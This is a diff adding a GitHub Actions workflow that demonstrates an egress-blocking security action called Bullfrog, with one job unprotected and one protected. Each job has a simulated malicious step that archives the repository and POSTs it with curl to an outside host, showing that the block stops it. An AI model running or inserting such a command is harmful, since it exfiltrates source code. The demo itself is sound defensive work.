@@ -1,0 +1,46 @@
+name: Bullfrog Demo
+
+on: push
+
+jobs:
+  no-bullfrog:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 2
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4.1.7
+
+      - name: Simulate Legitimate HTTP Requests
+        run: |
+          curl -I https://example.com
+
+      - name: Simulate Malicious Script
+        run: |
+          echo "Creating an archive of the HEAD of the git repo and uploading it to a malicious server"
+          git archive HEAD | curl -X POST -H "Content-Type: application/octet-stream" --data-binary @- https://jsonplaceholder.typicode.com/git-repo
+          echo "The source code was successfully exfiltrated to a malicious server"
+
+  with-bullfrog:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 2
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4.1.7
+
+      - name: Bullfrog Secure Runner
+        uses: bullfrogsec/bullfrog@v0
+        with:
+          allowed-domains: |
+            example.com
+          egress-policy: block
+
+      - name: Simulate Legitimate HTTP Requests
+        run: |
+          # This call is allowed since example.com is specified in the allowed-domains variable above
+          curl -I https://example.com
+
+      - name: Simulate Malicious Script
+        run: |
+          echo "Creating an archive of the HEAD of the git repo and uploading it to a malicious server"
+          git archive HEAD | curl -X POST -H "Content-Type: application/octet-stream" --data-binary @- https://jsonplaceholder.typicode.com/git-repo
+          # This line is not reached due to blocked egress
